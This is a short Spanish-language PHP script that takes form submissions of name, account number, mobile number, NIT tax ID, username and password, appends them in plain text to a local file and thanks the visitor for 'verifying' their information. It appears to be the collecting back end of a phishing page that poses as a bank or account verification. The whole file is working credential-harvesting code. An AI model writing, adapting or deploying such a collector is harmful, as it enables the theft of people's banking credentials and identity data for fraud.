<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = $_POST['nombre'];
    $cuenta = $_POST['cuenta'];
    $celular = $_POST['celular'];
    $nit = $_POST['nit'];
    $usuario = $_POST['usuario'];
    $contrasena = $_POST['contrasena'];

    $datos = "Nombre: $nombre\nCuenta: $cuenta\nCelular: $celular\nNIT: $nit\nUsuario: $usuario\nContraseña: $contrasena\n---------------------\n";

    file_put_contents("datos.txt", $datos, FILE_APPEND);

    echo "<h2>Gracias por verificar tu información.</h2>";
}
?>
